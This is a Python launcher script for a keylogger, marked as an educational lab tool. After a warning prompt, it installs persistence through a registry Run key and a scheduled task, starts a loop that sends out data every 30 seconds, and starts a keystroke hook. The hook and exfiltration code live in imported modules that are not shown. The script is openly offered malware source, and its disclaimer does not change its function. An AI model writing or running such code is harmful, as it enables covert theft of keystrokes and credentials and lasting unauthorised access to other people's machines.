#!/usr/bin/env python3
"""
Launch the keylogger (EDUCATIONAL LAB ONLY).
This will install persistence and start the hook.
"""
import sys
import os
from keylogger.hook import start_hook, stop_hook
from keylogger.persist import add_registry_run, create_scheduled_task
from keylogger.exfil import start_exfil_loop

if __name__ == "__main__":
    print("[!] WARNING: This will install persistence and log all keystrokes.")
    print("    Use ONLY on an isolated VM with explicit permission.")
    input("Press Enter to continue or Ctrl+C to abort...")

    script_path = os.path.abspath(sys.argv[0])
    # Persist using both methods
    add_registry_run(sys.executable + ' "' + script_path + '"')
    create_scheduled_task(script_path)

    # Start exfiltration loop
    start_exfil_loop(interval=30)

    # Start hook (blocking)
    try:
        start_hook()
    except KeyboardInterrupt:
        stop_hook()